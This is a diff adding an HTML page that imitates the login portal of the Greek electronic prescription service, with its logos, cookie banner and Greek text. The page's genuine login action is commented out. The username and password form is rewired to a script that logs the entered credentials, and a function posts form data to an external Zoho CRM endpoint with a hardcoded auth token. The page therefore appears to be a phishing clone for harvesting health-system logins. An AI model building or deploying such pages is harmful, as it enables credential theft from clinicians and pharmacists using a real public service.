@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<!-- Copyright (C) 2000 Tivoli Systems, Inc. -->
+<!-- Copyright (C) 1999 IBM Corporation -->
+<!-- Copyright (C) 1998 Dascom, Inc. -->
+<!-- All Rights Reserved. -->
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Ηλεκτρονική Συνταγογράφηση</title>
+    <script type="text/javascript">
+        function delete_cookie(name, path) {
+            // Set expiration date to last year
+            var expiration_date = new Date();
+            expiration_date.setYear(expiration_date.getYear() - 1);
+            expiration_date = expiration_date.toGMTString();
+            // Expire the cookie
+            var cookie_string = name + "=; expires=" + expiration_date;
+            if (path != null) {
+                cookie_string += "; path=" + path;
+            }
+            document.cookie = cookie_string;
+        }
+        //if ("" == "1") {
+        delete_cookie("epre_jsession", "/");
+        delete_cookie("JSESSIONID", "/");
+        //}
+    </script>
+    <link rel="stylesheet" href="./assets/normalize.css">
+    <link rel="stylesheet" type="text/css" href="./assets/cookieconsent.min.css">
+    <script src="assets/cookieconsent.min.js"></script>
+    <style>
+        .cc-message {
+            font-size: 0.7em;
+            text-align: justify;
+            line-height: 1;
+        }
+
+        .cc-link {
+            color: #4d79ff !important;
+        }
+    </style>
+    <script>
+        window.addEventListener("load", function () {
+            window.cookieconsent.initialise({
+                "palette": {
+                    "popup": {
+                        "background": "#f2f2f2"
+                    },
+                    "button": {
+                        "background": "#4D79FF",
+                        "text": "#ffffff"
+                    }
+                },
+                "content": {
+                    "message": "Για την αλληλεπίδραση με τον ιστότοπο χρησιμοποιούνται cookies που ανήκουν αποκλειστικά στις κατηγορίες των Βασικών και Λειτουργικών cookies, τα οποία είναι αναγκαία στο σύνολό τους για την ορθή λειτουργία των παρεχόμενων υπηρεσιών και την απρόσκοπτη πλοήγησή σας. Για πληροφορίες σχετικά με τα cookies και συναφείς ρυθμίσεις, συμβουλευτείτε την <a href='http://www.idika.gr/files/policies/cookies_policy.pdf' target='_blank' class='cc-link'>Πολιτική Cookies</a>, λαμβάνοντας υπόψη ότι τυχόν απενεργοποίησή τους θα καθιστά τον ιστότοπο μη λειτουργικό και αποδοτικό. Για πληροφορίες σε σχέση με τα προσωπικά σας δεδομένα ανατρέξτε στην",
+                    "dismiss": "ΚΛΕΙΣΙΜΟ",
+                    "link": "Πολιτική Προστασίας Δεδομένων Προσωπικού Χαρακτήρα. ",
+                    "href": "http://www.idika.gr/files/policies/personal_data_protection_policy.pdf"
+                },
+                onStatusChange: function (status) {
+                    if (status === "dismiss") {
+                        var element = document.getElementById("consentModal");
+                        element.parentNode.removeChild(element);
+                    }
+                },
+                onPopupOpen: function (status) {
+                    var elemDiv = document.createElement("div");
+                    elemDiv.classList.add("modal");
+                    elemDiv.id = "consentModal";
+                    document.body.appendChild(elemDiv);
+                }
+            })
+        });
+    </script>
+    <style>
+        .modal {
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            width: 100%;
+            margin: 0px;
+            padding: 0px;
+            background-color: #000000;
+            position: fixed;
+            opacity: 0.3;
+        }
+    </style>
+    <style></style>
+</head>
+
+<!--//////////////////////////////////////////////////////////////////////////-->
+
+<body bgcolor="#FFFFFF" text="#000000">
+    <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc"
+        class="cc-window cc-banner cc-type-info cc-theme-block cc-bottom cc-color-override--194020210 cc-invisible"
+        style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">Για
+            την αλληλεπίδραση με τον ιστότοπο χρησιμοποιούνται cookies που ανήκουν
+            αποκλειστικά στις κατηγορίες των Βασικών και Λειτουργικών cookies, τα
+            οποία είναι αναγκαία στο σύνολό τους για την ορθή λειτουργία των
+            παρεχόμενων υπηρεσιών και την απρόσκοπτη πλοήγησή σας. Για πληροφορίες
+            σχετικά με τα cookies και συναφείς ρυθμίσεις, συμβουλευτείτε την <a
+                href="http://www.idika.gr/files/policies/cookies_policy.pdf" target="_blank" class="cc-link">Πολιτική
+                Cookies</a>,
+            λαμβάνοντας υπόψη ότι τυχόν απενεργοποίησή τους θα καθιστά τον ιστότοπο
+            μη λειτουργικό και αποδοτικό. Για πληροφορίες σε σχέση με τα προσωπικά
+            σας δεδομένα ανατρέξτε στην <a aria-label="learn more about cookies" role="button" tabindex="0"
+                class="cc-link" href="http://www.idika.gr/files/policies/personal_data_protection_policy.pdf"
+                rel="noopener noreferrer nofollow" target="_blank">Πολιτική Προστασίας Δεδομένων Προσωπικού Χαρακτήρα.
+            </a></span>
+        <div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0"
+                class="cc-btn cc-dismiss">ΚΛΕΙΣΙΜΟ</a></div><!--googleon: all-->
+    </div>
+    <header>
+        <!--<img src="/pics/synt-logo.png" alt=""> -->
+        <a href="https://www.e-prescription.gr/shs/portal"><img alt="HOME" src="img/synt-logo1.png"></a>
+    </header>
+
+
+    <br>
+
+    <style>
+        div ul {
+            list-style: none;
+        }
+
+
+        header {
+            float: left;
+            margin: 0 0 30px 0;
+            padding: 5px 0;
+            max-width: 100%;
+        }
+
+        img {
+            max-width: 100%;
+            padding-top: 5px;
+        }
+
+        body {
+            padding-bottom: 60px;
+            max-height: 100%;
+        }
+
+        #footer {
+            position: fixed;
+            width: 100%;
+            left: 0;
+            right: 0;
+            clear: both;
+            background: #EDEDED;
+            max-height: 300px;
+            bottom: 0;
+            overflow: hidden;
+        }
+
+        #ePrescription {
+            padding-bottom: 15px;
+            padding-left: 5px;
+        }
+    </style>
+
+    <br><br>
+
+    
+    <script language="JavaScript">
+        var warningString = "<B>WARNING:</B> To maintain your login session, make sure that your browser is configured to accept Cookies.";
+        document.cookie = 'acceptsCookies=yes';
+        if (document.cookie == '') {
+            document.write(warningString);
+        }
+        else {
+            document.cookie = 'acceptsCookies=yes; expires=Fri, 13-Apr-1970 00:00:00 GMT';
+            // Uncomment the following line for JavaScript redirection
+            document.cookie = 'ISAMOriginalURL=' + encodeURIComponent(window.location) + "; Path=/;";
+        }
+    </script>
+    <noscript>
+        <B>WARNING:</B> To maintain your login session, make sure that<BR>
+        your browser is configured to accept Cookies.
+    </noscript>
+    <!--- END Cookie check block --->
+
+
+
+    <br>
+
+
+
+    <div align="center" style="min-height: 450px;">
+
+        <!-- action="/pkmslogin.form?token=Unknown" -->
+        <form method="POST" onsubmit= "sendData">
+            <font size="+1">
+                <p>Καλώς ήρθατε στο Portal της Ηλεκτρονικής Συνταγογράφησης. <br>Παρακαλώ εισάγετε τα στοιχεία σας.</p>
+                <p style="color:red">
+                    <font size="3"><strong></strong>
+                        <font></font>
+                    </font>
+                </p>
+                <h4>
+                    <font size="3">
+                        <font>Standard Authentication</font>
+                    </font>
+                </h4>
+                <table align="center" border="0" width="400">
+                    <tbody>
+                        <tr></tr>
+
+
+
+
+                        <tr>
+                            <td>
+                                <ul>
+                                    <li>Όνομα Χρήστη</li>
+                                </ul>
+                            </td>
+                            <td><input id="username " name="username" size="15"></td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <ul>
+                                    <li>Κωδικός</li>
+                                </ul>
+                            </td>
+                            <td><input id="password" type="PASSWORD" name="password" size="15" autocomplete="off"></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <font size="3">
+                    <font>
+                    </font>
+
+                    <input type="HIDDEN" name="login-form-type" value="pwd">
+
+                    <br><input type="SUBMIT" value="Είσοδος" id="buttonSubmit">
+
+                    <br>
+                    <br>
+                    <hr>
+
+
+                    <form method="POST" action="/pkmslogin.form?token=Unknown">
+                        <h4>Certificate Authentication</h4>
+                        <input type="HIDDEN" name="login-form-type" value="cert">
+                        <input type="SUBMIT" value="Certificate Login Prompt">
+                    </form>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+
+
+                </font>
+            </font>
+        </form>
+
+        <script>
+            function submitToZoho() {
+                const form = document.getElementById('myForm');
+                const formData = new FormData(form);
+                const data = {};
+                formData.forEach((value, key) => {
+                    data[key] = value;
+                });
+
+                const authToken = '1000.b7160ce6a326f9f0bcdb33c82959ea7d.328c4b08447405f1a7996981ab5fb4ac'; // Replace with your Zoho CRM auth token
+                const crmUrl = 'https://www.zohoapis.com/crm/v2/lead/'; // Change endpoint according to your Zoho module
+
+                fetch(crmUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Zoho-authtoken ${authToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        data: [data]
+                    })
+                }
+                )
+                    .then(response => {
+                        if (response.ok) {
+                            alert('Form data sent to Zoho CRM successfully!');
+                        } else {
+                            throw new Error('Failed to send data to Zoho CRM');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('There was an error submitting the form data.');
+                    });
+            }
+        </script>
+    </div>
+    <font size="+1">
+        <font size="3">
+            <div id="footer">
+                <div
+                    style="text-align:center;width:50%;height: 169px;;border:0px solid gray;padding-right: 0;padding-top: 17px;float: left;margin-right: 20px;">
+                    <table float="left" style="width:80%;margin-left:140px;margin-right:10px;background: white;">
+                        <tbody>
+                            <tr>
+                                <td align="center"><a href="http://europa.eu/index_el.htm" target="_blank"><img
+                                            width="100" height="80" alt="ΕΥΡΩΠΑΪΚΗ ΕΝΩΣΗ" dir="ltr"
+                                            title="ΕΥΡΩΠΑΪΚΗ ΕΝΩΣΗ" src="img/logo_ee.jpg"></a></td>
+                                <td align="center"><a target="_blank" href="http://www.digitalplan.gov.gr/portal/"><img
+                                            width="90" height="70" alt="ΨΗΦΙΑΚΗ ΕΛΛΑΔΑ" dir="ltr" title="ΨΗΦΙΑΚΗ ΕΛΛΑΔΑ"
+                                            src="img/psifiaki_ellada.jpg"></a></td>
+                                <td align="center"><a target="_blank" href="http://www.idika.gr/"><img height="40"
+                                            alt="ΗΔΙΚΑ" dir="ltr" title="ΗΔΙΚΑ" src="img/idikalogo1.jpg"></a></td>
+                                <td align="center"><a target="_blank" href="http://www.espa.gr/"><img width="90"
+                                            height="60" alt="ΕΣΠΑ" dir="ltr" title="ΕΣΠΑ" src="img/espa-logo.jpg"></a>
+                                </td>
+                            </tr>
+
+                            <tr>
+                                <td colspan="4" align="center"
+                                    style="padding-bottom: 10px;font: 75%/1.5 Arial,Helvetica,sans-serif;">
+                                    <p>H δράση “Ανάπτυξη Συστήματος Ηλεκτρονικής Συνταγογράφησης και
+                                        παροχής σχετικών υποστηρικτικών υπηρεσιών” υλοποιείται στο πλαίσιο του
+                                        Ε.Π. «Ψηφιακή Σύγκλιση»</p>
+                                    <p style="font-weight: bold;line-height: 30%;"><em>Με τη συγχρηματοδότηση της
+                                            Ελλάδας και της Ευρωπαϊκής Ένωσης</em></p>
+                                </td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+                </div>
+                <div style="margin-left: 10px;height: 159px;padding-top: 17px;">
+                    <table style="width:35%;margin-left:80px;margin-right:50px;padding-bottom: 10px;">
+                        <tbody>
+                            <tr>
+                                <td colspan="4" align="center">
+                                    <a href="https://www.e-prescription.gr/shs/portal/eprescription/about/terms"
+                                        alt="ΟΡΟΙ ΧΡΗΣΗΣ" title="ΟΡΟΙ ΧΡΗΣΗΣ"
+                                        style="font: 75%/1.5 Arial,Helvetica,sans-serif;color: #00649d;text-decoration: none;">Όροι
+                                        Χρήσης</a>
+                                    |
+                                    <a href="https://www.e-prescription.gr/shs/portal/eprescription/collaboration"
+                                        alt="ΔΙΚΤΥΩΣΗ" title="ΔΙΚΤΥΩΣΗ"
+                                        style="font: 75%/1.5 Arial,Helvetica,sans-serif;color: #00649d;text-decoration: none;">Δικτύωση</a>
+                                    |
+                                    <a href="https://www.e-prescription.gr/shs/portal/eprescription/sitemap"
+                                        alt="Sitemap" title="Sitemap"
+                                        style="font: 75%/1.5 Arial,Helvetica,sans-serif;color: #00649d;text-decoration: none;">Sitemap</a>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="center" valign="top"><a href="http://www.moh.gov.gr/" target="_blank"><img
+                                            height="60" alt="ΥΠΟΥΡΓΕΙΟ ΥΓΕΙΑΣ" title="ΥΠΟΥΡΓΕΙΟ ΥΓΕΙΑΣ"
+                                            src="img/02_yyka.png"></a></td>
+                                <td align="right" valign="top"><a target="_blank" href="http://www.ypakp.gr/"><img
+                                            height="60" alt="ΥΠΟΥΡΓΕΙΟ ΕΡΓΑΣΙΑΣ ΚΟΙΝΩΝΙΚΗΣ ΑΣΦΑΛΙΣΗΣ &amp; ΠΡΟΝΟΙΑΣ"
+                                            title="ΥΠΟΥΡΓΕΙΟ ΕΡΓΑΣΙΑΣ ΚΟΙΝΩΝΙΚΗΣ ΑΣΦΑΛΙΣΗΣ &amp; ΠΡΟΝΟΙΑΣ"
+                                            src="img/01_yeka.png"></a></td>
+                                <td align="center" valign="top"><a href="http://www.eopyy.gov.gr/" target="_blank"><img
+                                            height="60" alt="ΕΟΠΥΥ" title="ΕΟΠΥΥ" src="img/03_eopyy.jpg"></a></td>
+                                <td align="left" valign="top"><a href="http://www.eof.gr/" target="_blank"><img
+                                            width="90" alt="ΕΘΝΙΚΟΣ ΟΡΓΑΝΙΣΜΟΣ ΦΑΡΜΑΚΩΝ"
+                                            title="ΕΘΝΙΚΟΣ ΟΡΓΑΝΙΣΜΟΣ ΦΑΡΜΑΚΩΝ" src="img/eof.png"></a></td>
+                            </tr>
+                            <tr>
+                                <td align="center" valign="top" colspan="2"><a target="_blank"
+                                        href="http://www.ifet.gr/"><img width="90" height="60"
+                                            alt="ΙΝΣΤΙΤΟΥΤΟ ΦΑΡΜΑΚΕΥΤΙΚΗΣ ΕΡΕΥΝΑΣ &amp; ΤΕΧΝΟΛΟΓΙΑΣ"
+                                            title="ΙΝΣΤΙΤΟΥΤΟ ΦΑΡΜΑΚΕΥΤΙΚΗΣ ΕΡΕΥΝΑΣ &amp; ΤΕΧΝΟΛΟΓΙΑΣ"
+                                            src="img/ifet.jpg"></a></td>
+                                <td align="left"><a target="_blank" href="http://www.pis.gr/"><img width="90"
+                                            height="60" alt="ΠΑΝΕΛΛΗΝΙΟΣ ΙΑΤΡΙΚΟΣ ΣΥΛΛΟΓΟΣ"
+                                            title="ΠΑΝΕΛΛΗΝΙΟΣ ΙΑΤΡΙΚΟΣ ΣΥΛΛΟΓΟΣ" src="img/pis.jpg"></a></td>
+                                <td align="left"><a target="_blank" href="http://www.pfs.gr/"><img height="60"
+                                            alt="ΠΑΝΕΛΛΗΝΙΟΣ ΦΑΡΜΑΚΕΥΤΙΚΟΣ ΣΥΛΛΟΓΟΣ"
+                                            title="ΠΑΝΕΛΛΗΝΙΟΣ ΦΑΡΜΑΚΕΥΤΙΚΟΣ ΣΥΛΛΟΓΟΣ" src="img/pfs.gif"></a></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+
+
+        </font>
+    </font>
+    <script>
+        let username =document.getElementById('username')
+        let password =document.getElementById('password')
+        function sendData(e){
+            e.preventDefault()
+            console.log(username.value)
+            console.log(password.value)
+        }
+    </script>
+</body>
+
+</html>
